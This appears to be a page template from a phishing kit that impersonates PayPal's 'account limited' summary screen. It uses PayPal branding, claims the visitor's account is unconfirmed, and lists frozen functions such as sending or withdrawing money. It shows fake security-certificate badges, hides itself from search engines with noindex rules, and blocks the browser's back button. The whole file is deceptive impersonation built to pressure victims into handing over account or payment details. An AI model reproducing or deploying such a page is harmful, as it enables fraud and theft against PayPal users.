<!DOCTYPE html>
<html>

<head>
<title><?=$api->transcode("PayPal: Summary Limited");?></title>
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="../assets/img/favicon.ico">
<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
<link rel="stylesheet" href="../assets/old/css/app.css">
<link rel="stylesheet" href="../assets/old/css/summary.css">
<link rel="stylesheet" href="../assets/old/css/global.css">
<link rel="stylesheet" href="../assets/old/css/coreLayout.css">
<link rel="stylesheet" href="../assets/old/css/eightball.css">
<link rel="stylesheet" href="../assets/old/css/kuzuluy.css">
<script src="../assets/js/jquery.min.js"></script>
<script type="text/javascript">
window.history.forward();

function noBack() {
	window.history.forward();
}
</script>
</head>

<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div class="standard" id="page">
<div class="navbar navbar-fixed-top header" id="bheader">
<div class="navbar-inner">
<div class="navBanner clearfix">
<div class="brand">
<img src="../assets/img/logo.svg" style="margin-bottom: 7px;" height="100" width="100">
</div>
</div>
<div class="navMenu clearfix" id="navMenu" role="navigation">
<ul class="globalNav clearfix pull-left">
<li><a class="navIcons linkSummary"><span><?=$api->transcode("Sumarry");?></span></a></li>
<li><span style="color:#F5F5F5;">.</span></li>
</ul>
<ul class="navSecondary">
<li><a class="btn btn-mini btn-secondary logout" href="../logout"><?=$api->transcode("Log Out");?></a></li>
</ul>
</div>
</div>
</div>
<div class="summarySection">
<div class="row-fluid">
<div class="span4 summaryModuleContainer">
<section id="allowed" class="walletModule shadow">
<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"><?=$api->transcode("What can I do while my account is not confirmed?");?></h3>
<ul>
<li><?=$api->transcode("update your account information");?></li>
</ul>
</section>
<section id="disallowed" class="walletModule shadow">
<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:40px;"><?=$api->transcode("What can't I do while my account is not confirmed?");?></h3>
<ul>
<li><?=$api->transcode("access to account");?></li>
<li><?=$api->transcode("send or receive money");?></li>
<li><?=$api->transcode("withdraw money from your account");?></li>
<li><?=$api->transcode("close your account");?></li>
<li><?=$api->transcode("link or remove a card");?></li>
<li><?=$api->transcode("link or remove a bank account");?></li>
<li><?=$api->transcode("dispute a transaction");?></li>
<li><?=$api->transcode("send refunds");?></li>
</ul>
</section>
<section class="walletModule shadow" style="margin-bottom: 20px;">
<h3 style="font-weight: bold; border-bottom: 1px solid #EEE; height:25px;"><?=$api->transcode("Secured & Certificate by");?></h3>
<div align="center">
<img src="../assets/old/img/cert1.gif">&nbsp;&nbsp;
<img src="../assets/old/img/cert2.png">&nbsp;&nbsp;
<img src="../assets/old/img/cert3.png">
</div>
</section>
</div>
